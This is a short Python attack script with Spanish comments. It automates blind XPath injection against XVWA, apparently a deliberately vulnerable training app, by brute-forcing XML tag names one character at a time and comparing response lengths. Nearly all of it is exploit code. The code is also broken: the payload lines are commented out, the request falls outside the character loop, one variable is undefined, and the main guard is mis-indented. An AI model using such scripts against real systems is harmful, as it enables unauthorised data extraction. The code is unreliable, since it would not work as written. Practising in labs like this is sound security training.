//Este script automatiza la búsqueda de etiquetas en un ataque de XPATH injection contra xml

```python
#!/usr/bin/python3

from pwn import *

import requests
import time
import sys
import pdb
import string
import signal 

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
main_url = "http://192.168.111.41/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters


def xPathInjection():
	
	data = ""
	
	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando ataque de fuerza bruta")
	
	time.sleep(2)
	
	p2 = log.progress("Data")
	
	for first_position in range(1, 6): # Aquí cambiamos manualmente el rango dependiendo de la cantidad de letras que tiene la palabra que estemos buscando
		for second_position in range(1, 21): 
			for character in characters:
				
				post_data = { # Descomentar una a una las siguientes búsquedas
					# Primera etiqueta 'search': "1' and substring(name(/*[1]),%d,1)='%s" % (position, character),
					# Primera subetiqueta 'search': "1' and substring(name(/*[1]/*[1]),%d,1)='%s" % (position, character),
					# Parametros subetiqueta 'search': "1' and substring(name(/*[1]/*[1]/*[%d]),%d,1)='%s" % (first_position, second_position, character),
					'submit': ''
				}
			
			r = requests.post(main_url, data=post_data)
			
		#	print(len(r.text)) # Aquí jugamos comentando y descomentando para saber la longitud de la etiqueta, una vez descubierta descomentamos el siguiente if y le añadimos la longitud
			
			if len(r.text) != 8681 and len(r.text) != 8692:
				print(len(r.text))
				data += character
				p2.status(data)
				break
				
		if first_position != 5:
			data += ":"
	
	p1.success("Ataque de fuerza bruta concluido")
	p2.success(data)
	
	if __name__ == '__main__':
	
	
	xPathInjection()	
```
